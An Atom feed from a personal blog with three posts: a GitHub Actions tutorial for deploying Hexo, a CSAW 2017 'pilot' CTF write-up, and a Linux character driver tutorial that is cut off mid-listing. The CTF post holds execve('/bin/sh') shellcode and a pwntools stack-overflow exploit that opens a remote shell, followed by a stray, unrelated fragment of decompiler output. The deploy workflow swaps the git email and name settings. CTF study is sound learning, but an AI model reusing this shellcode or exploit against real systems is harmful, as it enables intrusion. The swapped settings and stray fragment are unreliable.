<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>Normal Blog</title>
  
  
  <link href="http://aslin.site/atom.xml" rel="self"/>
  
  <link href="http://aslin.site/"/>
  <updated>2022-12-26T14:43:03.810Z</updated>
  <id>http://aslin.site/</id>
  
  <author>
    <name>ACce1er4t0r</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Automated deploying Hexo blogs by Github Actions</title>
    <link href="http://aslin.site/2022/12/18/Automated-deploying-Hexo-blogs-with-Github-Actions/"/>
    <id>http://aslin.site/2022/12/18/Automated-deploying-Hexo-blogs-with-Github-Actions/</id>
    <published>2022-12-18T22:38:27.000Z</published>
    <updated>2022-12-26T14:43:03.810Z</updated>
    
    <content type="html"><![CDATA[<p>Github Actions can easily implement CI&#x2F;CD workflows to help us do some work, such as automated testing, packaging, deployment and other operations.</p><span id="more"></span><p>When we run Jobs, it creates a container (runner) that supports Ubuntu, Windows, and MacOS. In the container we can install software, use the installed software to help us process some data, and then push the processed data somewhere.</p><p>In this article, we’ll introduce the use of GitHub Actions to automate the deployment of Hexo to GitHub Pages. Generally, blogs that use Hexo use <code>hexo generate --deploy</code> to deploy, but this can take a long time if there are a lot of articles, or if the local node.js version is not compatible with Hexo. Using GitHub Actions helps you to avoid these situations.</p><h2 id="blog-and-xxx-github-io-repository"><a href="#blog-and-xxx-github-io-repository" class="headerlink" title="blog and xxx.github.io repository"></a><code>blog</code> and <code>xxx.github.io</code> repository</h2><p>You need two Git repositories, one for the blog source repository <code>blog</code> and one for the static page repository <code>xxx.github.io</code></p><p>The blog source repository, <code>blog</code>, can be private.</p><p>The static page repository <code>xxx.github.io</code>, which must be public.</p><h2 id="deploy-keys"><a href="#deploy-keys" class="headerlink" title="deploy keys"></a>deploy keys</h2><p>Create a key using ssh-keygen (you can also use id_rsa if you want)</p><p>In the blog source code repository page, add new <code>secret</code> via <code>setting -&gt; Security -&gt; Secrets -&gt; Actions -&gt; New repository secret</code>. The content is the private key.</p><p><img src="https://s2.loli.net/2022/12/25/ZjNBCiGHPbVpJSn.png" alt="image.png"></p><p>In the static page repository page, add new <code>Deploy keys</code> via <code>setting -&gt; Security -&gt; Deploy keys</code>. The content is the public key. And select “Allow Write Access”.</p><h2 id="Create-GitHub-Actions"><a href="#Create-GitHub-Actions" class="headerlink" title="Create GitHub Actions"></a>Create GitHub Actions</h2><p>Create a .github&#x2F;workflows&#x2F;xxx.yml file in the root of the blog source repository</p><figure class="highlight yml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="attr">name:</span> <span class="string">HEXO_DEPLOY</span></span><br><span class="line"><span class="attr">on:</span> [<span class="string">push</span>]</span><br><span class="line"></span><br><span class="line"><span class="attr">env:</span></span><br><span class="line">  <span class="attr">GIT_USER:</span> <span class="string">ACce1er4t0r</span></span><br><span class="line">  <span class="attr">GIT_EMAIL:</span> <span class="string">lkjlkj174@gmail.com</span></span><br><span class="line">  <span class="attr">THEME_REPO:</span> <span class="string">ppoffice/hexo-theme-icarus</span></span><br><span class="line">  <span class="attr">THEME_BRANCH:</span> <span class="string">master</span></span><br><span class="line">  <span class="attr">DEPLOY_REPO:</span> <span class="string">ACce1er4t0r/ACce1er4t0r.github.io</span></span><br><span class="line">  <span class="attr">DEPLOY_BRANCH:</span> <span class="string">main</span></span><br><span class="line"></span><br><span class="line"><span class="attr">jobs:</span></span><br><span class="line">  <span class="attr">build:</span></span><br><span class="line">    <span class="attr">runs-on:</span> <span class="string">ubuntu-latest</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">steps:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span> <span class="string">source</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v3</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span> <span class="string">theme</span> <span class="string">repo</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v3</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">repository:</span> <span class="string">$&#123;&#123;</span> <span class="string">env.THEME_REPO</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">ref:</span> <span class="string">$&#123;&#123;</span> <span class="string">env.THEME_BRANCH</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">path:</span> <span class="string">themes/icarus</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Checkout</span> <span class="string">deploy</span> <span class="string">repo</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/checkout@v3</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">repository:</span> <span class="string">$&#123;&#123;</span> <span class="string">env.DEPLOY_REPO</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">ref:</span> <span class="string">$&#123;&#123;</span> <span class="string">env.DEPLOY_BRANCH</span> <span class="string">&#125;&#125;</span></span><br><span class="line">          <span class="attr">path:</span> <span class="string">.deploy_git</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Use</span> <span class="string">Node.js</span> <span class="number">14</span></span><br><span class="line">        <span class="attr">uses:</span> <span class="string">actions/setup-node@v2</span></span><br><span class="line">        <span class="attr">with:</span></span><br><span class="line">          <span class="attr">node-version:</span> <span class="number">14</span></span><br><span class="line"></span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Setup</span> <span class="string">key</span></span><br><span class="line">        <span class="attr">env:</span></span><br><span class="line">          <span class="attr">ACTION_DEPLOY_KEY:</span> <span class="string">$&#123;&#123;</span> <span class="string">secrets.BLOG_DEPLOY</span> <span class="string">&#125;&#125;</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line"><span class="string">          mkdir -p ~/.ssh/</span></span><br><span class="line"><span class="string">          echo &quot;$ACTION_DEPLOY_KEY&quot; &gt; ~/.ssh/id_rsa</span></span><br><span class="line"><span class="string">          chmod 600 ~/.ssh/id_rsa</span></span><br><span class="line"><span class="string">          ssh-keyscan github.com &gt;&gt; ~/.ssh/known_hosts</span></span><br><span class="line"><span class="string">          git config --global user.email $GIT_USER</span></span><br><span class="line"><span class="string">          git config --global user.name $GIT_EMAIL</span></span><br><span class="line"><span class="string">          npm install</span></span><br><span class="line"><span class="string">          npm install --save hexo-component-inferno@^2.0.2</span></span><br><span class="line"><span class="string"></span>          </span><br><span class="line">      <span class="bullet">-</span> <span class="attr">name:</span> <span class="string">Hexo</span> <span class="string">deploy</span></span><br><span class="line">        <span class="attr">run:</span> <span class="string">|</span></span><br><span class="line">          <span class="string">npm</span> <span class="string">run</span> <span class="string">deploy</span></span><br></pre></td></tr></table></figure><p><strong>Meaning of the parameters</strong></p><ul><li><strong>name:</strong> the name of the Action</li><li><strong>on:</strong> Trigger condition, this task will be triggered when the condition is met, <code>here on.push.branches.$.master</code> means that the task will be executed when the master branch receives the push. </li><li><strong>env:</strong> Environment variable objects</li><li><strong>jobs:</strong> List of tasks under Action<ul><li><strong>jobs.{job}.name:</strong> Task name</li><li><strong>jobs.{job}.runs-on:</strong> The required container for the task, optional values: <code>ubuntu-latest</code>, <code>windows-latest</code>, <code>macos-latest</code>.</li><li><strong>jobs.{job}.strategy:</strong> policy, can be written in array format, the job will iterate through this array.</li><li><strong>jobs.{job}.steps:</strong> A step where you can put what you want to do in steps.<ul><li><strong>jobs.{job}.steps.$.name:</strong> The name of the step, which will be output as a LOG when compiled.</li><li><strong>jobs.{job}.steps.$.uses:</strong> The Action to be called, you can see more at <a href="https://github.com/actions">https://github.com/actions</a>.</li><li><strong>jobs.{jobs}.steps.$.with:</strong> An object that calls the Action, see the description of the Action used for details.</li></ul></li></ul></li></ul><p>Finally, just push the file to the master branch</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;Github Actions can easily implement CI&amp;#x2F;CD workflows to help us do some work, such as automated testing, packaging, deployment and other operations.&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>PWN Learning: CSAW 2017 Quals - pilot</title>
    <link href="http://aslin.site/2022/03/17/PWN-Learning-CSAW-2017-Quals-pilot/"/>
    <id>http://aslin.site/2022/03/17/PWN-Learning-CSAW-2017-Quals-pilot/</id>
    <published>2022-03-17T01:59:48.000Z</published>
    <updated>2022-12-26T14:43:03.810Z</updated>
    
    <content type="html"><![CDATA[<p>CSAW 2017 Quals - pilot Write up</p><span id="more"></span><p>A C++ PWN problem, the source code can be seen after decompiling by ida pro</p><p><img src="https://s2.loli.net/2022/03/17/O8YKSLxgCEXHFGq.png" alt="image.png"></p><p>A stack overflow vulnerability can be quickly discovered by decompiling the code</p><p>Debugging with gdb, pattern_create 100 after the input generated error messages</p><p><img src="https://s2.loli.net/2022/03/17/8tIn3AJvDM691Hd.png" alt="image.png"></p><p>It can be calculated that the offset is 40 bytes, after inputting 40 bytes of data can overwrite the subsequent 8 bytes of return address</p><p>Use the following shellcode (execve([“&#x2F;bin&#x2F;sh”],[],[]))</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"> 0:   31 f6                   xor    esi, esi</span><br><span class="line"> 2:   48                      dec    eax</span><br><span class="line"> 3:   bb 2f 62 69 6e          mov    ebx, 0x6e69622f</span><br><span class="line"> 8:   2f                      das    </span><br><span class="line"> 9:   2f                      das    </span><br><span class="line"> a:   73 68                   jae    0x74</span><br><span class="line"> c:   56                      push   esi</span><br><span class="line"> d:   53                      push   ebx</span><br><span class="line"> e:   54                      push   esp</span><br><span class="line"> f:   5f                      pop    edi</span><br><span class="line">10:   6a 3b                   push   0x3b</span><br><span class="line">12:   58                      pop    eax</span><br><span class="line">13:   31 d2                   xor    edx, edx</span><br><span class="line">15:   0f 05                   syscall</span><br></pre></td></tr></table></figure><p>Get flag</p><p><img src="https://s2.loli.net/2022/03/17/IP45KfbMCv37yRa.png" alt="image.png"></p><p>Here is the attack script:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">shellcode = b&quot;\x31\xf6\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x56\x53\x54\x5f\x6a\x3b\x58\x31\xd2\x0f\x05</span><br><span class="line"># print(disasm(shellcode))</span><br><span class="line"></span><br><span class="line">#io = process(&quot;./easy_pwn&quot;)</span><br><span class="line">io = remote(&quot;xxx.xxx.xxx.xxx&quot;, xxxx)</span><br><span class="line"></span><br><span class="line">io.recvuntil(&quot;Location:&quot;)</span><br><span class="line">addr = int(io.recv()[0:14], 16)</span><br><span class="line"># print(address)</span><br><span class="line"></span><br><span class="line">io.sendline(shellcode+b&#x27;a&#x27;*(40-len(shellcode))+p64(addr))</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>_JUNK_FUN_0((3 * dword_100910C0 * dword_100910C4 * dword_100910CC + 4096) | (dword_100910C4+ dword_100910D0+ 2 * (4096 - dword_100910C8)- dword_100910C0 * dword_100910CC+ 3 * dword_100910D4),(2 * (dword_100910D0 * (dword_100910D4 + dword_100910D0) + dword_100910C8 * (dword_100910C4 * dword_100910C8 * dword_100910C8 + 2) + 4 * (dword_100910C0 - dword_100910CC) + 4096 - dword_100910D4)) | (6 * (2 * dword_100910C4- dword_100910D4 * (dword_100910C8 * dword_100910CC + 1) - dword_100910CC) + dword_100910D0* (6* (dword_100910C0 * dword_100910C8 * dword_100910D0 - dword_100910C4 * dword_100910D4)- 6)+ 4096))</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;CSAW 2017 Quals - pilot Write up&lt;/p&gt;</summary>
    
    
    
    
  </entry>
  
  <entry>
    <title>Programming Linux Character Driver</title>
    <link href="http://aslin.site/2022/03/17/Programming-Linux-Character-Driver/"/>
    <id>http://aslin.site/2022/03/17/Programming-Linux-Character-Driver/</id>
    <published>2022-03-17T00:51:25.000Z</published>
    <updated>2022-12-26T14:43:03.810Z</updated>
    
    <content type="html"><![CDATA[<p>Linux Character Driver</p><span id="more"></span><h1 id="Character-Device-Structures"><a href="#Character-Device-Structures" class="headerlink" title="Character Device Structures"></a>Character Device Structures</h1><p>Character device driver, block device driver and network device driver as the linux kernel three major driver devices, character devices mainly complete the byte read and write operations, common applications are mouse, keyboard, etc., the structure form is shown below:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">kobject</span> <span class="title">kobj</span>;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">module</span> *<span class="title">owner</span>;</span>  <span class="comment">// Belonging modules</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">file_operations</span> *<span class="title">ops</span>;</span>  <span class="comment">// Character device operation method</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">list_head</span> <span class="title">list</span>;</span></span><br><span class="line">    <span class="type">dev_t</span> dev;     <span class="comment">// Device</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>The dev_t in the cdev structure represents the 32-bit device number, 12 bits are the major device number and 20 bits are the minor device number. The major device number and minor device number can be obtained from the dev_t by macro definitions MAJOR(dev_t dev) and MINOR(dev_t dev). In addition, dev_t can be generated from the primary and secondary device numbers using the macro definition MKDEV(int major, int minor).</li><li>The Linux kernel provides a set of functions to operate on character device structures, which can be used to manipulate the cdev structure.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">cdev_init</span><span class="params">(<span class="keyword">struct</span> cdev *, <span class="keyword">struct</span> file_operations *)</span>;  <span class="comment">// Used to initialize the members of cdev and establish the connection between cdev and file_operation</span></span><br><span class="line"><span class="keyword">struct</span> cdev *<span class="title function_">cdev_alloc</span><span class="params">(<span class="type">void</span>)</span>;  <span class="comment">// Used to dynamically request a cdev memory</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">cdev_put</span><span class="params">(<span class="keyword">struct</span> cdev *p)</span>;</span><br><span class="line"><span class="type">int</span> <span class="title function_">cdev_add</span><span class="params">(<span class="keyword">struct</span> cdev *, <span class="type">dev_t</span>, <span class="type">unsigned</span>)</span>;  <span class="comment">// Add a cdev to the system to complete the registration of the character device. The call to cdev_add() usually occurs in the character device driver module load function</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">cdev_del</span><span class="params">(<span class="keyword">struct</span> cdev *)</span>;  <span class="comment">// Deleting a cdev completes the cancellation of the character device. The call to the cdev_del() function usually occurs in the uninstall function of the character device driver module</span></span><br></pre></td></tr></table></figure><ul><li>Call register_chrdev_region() or alloc_chrdev_region() function to request a device number from the system, and then call cdev_add() function to register the character device with the system.</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">register_chrdev_region</span><span class="params">(<span class="type">dev_t</span> from, <span class="type">unsigned</span> count, <span class="type">const</span> <span class="type">char</span> *name)</span>;  <span class="comment">// Known starting device number</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">alloc_chrdev_region</span><span class="params">(<span class="type">dev_t</span> *dev, <span class="type">unsigned</span> baseminor, <span class="type">unsigned</span> count,<span class="type">const</span> <span class="type">char</span> *name)</span>;  <span class="comment">// Unknown starting device number</span></span><br></pre></td></tr></table></figure><ul><li>The member functions in the file_operations structure are eventually called by the kernel when the application makes Linux system calls such as open(), write(), read(), close(), etc.<ul><li>llseek() modifies the current read&#x2F;write location of a file and returns the new location, returning a negative value in case of error.</li><li>read() reads data from the device, returning the number of bytes read on success and a negative value on error. Corresponds to ssize_t read (int fd, void<em>buf, size_t count) and size_t fread (void</em>ptr, size_t size, size_t nmemb, FILE*stream) in user space applications.</li><li>write() sends data to the device and returns the number of bytes written on success. If this function is not implemented, the user will get the -EINVAL return value when making the write() system call. Corresponds to ssize_t write (int fd, constvoid<em>buf, size_t count) and size_t fwrite (const void</em>ptr, size_t size, size_t nmemb, FILE*stream) in user space applications.</li><li>read() and write() indicate end-of-file (EOF) if they return 0.</li><li>unlocked_ioctl() provides implementation of device-related control commands (neither read nor write operations) and returns a non-negative value to the calling program when called successfully. It is similar to the user-space application calls int fcntl (int fd, int cmd, … &#x2F;<em>arg</em>&#x2F;) and intioctl (int d, int request, …) counterparts.</li><li>mmap() maps device memory into the virtual address space of the process. If the device driver does not implement this function, the user will get the -ENODEV return value when making the mmap() system call. This function is of particular interest for devices such as frame buffers, which are mapped into user space so that applications can access them directly without having to copy memory between the kernel and the application. It corresponds to the void<em>mmap (void</em>addr, size_t length, int prot, int flags, int fd, off_t offset) function in user space applications.</li></ul></li><li>The functions for loading and unloading the character device driver module are as follows<ul><li>static int __init mydev_init(void) </li><li>static void __exit mydev_exit(void)</li><li>The application of device number and registration of cdev should be implemented in the load function of the character device driver module, while the release of device number and cancellation of cdev should be implemented in the unload function.</li></ul></li></ul><h1 id="Character-Structures-Programming"><a href="#Character-Structures-Programming" class="headerlink" title="Character Structures Programming"></a>Character Structures Programming</h1><blockquote><p>Create a new dev folder and create mydev.c and the corresponding Makefile file in this directory</p></blockquote><p>The mydev.c program is as follows:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/fs.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/init.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/cdev.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/slab.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/uaccess.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MYDEV_SIZE 0x1000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MEM_CLEAR 0x1</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MYDEV_MAJOR 230</span></span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span> mydev_major = MYDEV_MAJOR;  <span class="comment">//Define the major device number</span></span><br><span class="line">module_param(mydev_major, <span class="type">int</span>, S_IRUGO);  <span class="comment">// module parameter passing</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mydev_dev</span> &#123;</span>   <span class="comment">// Define the mydevmen_dev structure</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">cdev</span> <span class="title">cdev</span>;</span>  <span class="comment">// Character Structures</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> mem[MYDEV_SIZE];  <span class="comment">// Memory</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mydev_dev</span> * <span class="title">mydev_devp</span>;</span><span class="comment">// Declare the mydev structure object</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Read function of mydev device driver</span></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">mydev_read</span><span class="params">(<span class="keyword">struct</span> file * filp, <span class="type">char</span> __user * buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> * ppos)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> p = *ppos;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count = size;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mydev_dev</span> * <span class="title">dev</span> =</span> filp-&gt;private_data;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (p &gt;= MYDEV_SIZE) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; MYDEV_SIZE - p) &#123;</span><br><span class="line">        count = MYDEV_SIZE - p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (copy_to_user(buf, dev-&gt;mem + p, count)) &#123;</span><br><span class="line">        ret = -EFAULT;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *ppos += count;</span><br><span class="line">        ret = count;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;read %u bytes(s) from %lu\n&quot;</span>, count, p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Write function for mydev device driver</span></span><br><span class="line"><span class="type">static</span> <span class="type">ssize_t</span> <span class="title function_">mydev_write</span><span class="params">(<span class="keyword">struct</span> file * filp, <span class="type">const</span> <span class="type">char</span> __user * buf, <span class="type">size_t</span> size, <span class="type">loff_t</span> * ppos)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> p = *ppos;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> count = size;</span><br><span class="line">    <span class="type">int</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mydev_dev</span> * <span class="title">dev</span> =</span> filp-&gt;private_data;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (p &gt;= MYDEV_SIZE) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (count &gt; MYDEV_SIZE - p) &#123;</span><br><span class="line">        count = MYDEV_SIZE - p;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (copy_from_user(dev-&gt;mem + p, buf, count)) &#123;</span><br><span class="line">        ret = -EFAULT;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        *ppos += count;</span><br><span class="line">        ret = count;</span><br><span class="line">        printk(KERN_INFO <span class="string">&quot;written %u bytes(s) from %lu\n&quot;</span>, count, p);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// Addressing functions</span></span><br><span class="line"><span class="type">static</span> <span class="type">loff_t</span> <span class="title function_">mydev_llseek</span><span class="params">(<span class="keyword">struct</span> file * filp, <span class="type">loff_t</span> offset, <span class="type">int</span> flag)</span> &#123;</span><br><span class="line">    <span class="type">loff_t</span> ret = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">switch</span> (flag) &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>: <span class="comment">/* Seek from the beginning of the file */</span></span><br><span class="line">            <span class="keyword">if</span> (offset&lt; <span class="number">0</span> || (<span class="type">unsigned</span> <span class="type">int</span>)offset &gt; MYDEV_SIZE) &#123;</span><br><span class="line">                ret = -EINVAL;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            filp-&gt;f_pos = (<span class="type">unsigned</span> <span class="type">int</span>)offset;</span><br><span class="line">            ret = filp-&gt;f_pos;</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>: <span class="comment">/* Seek from the current location of the file */</span></span><br><span class="line">            <span 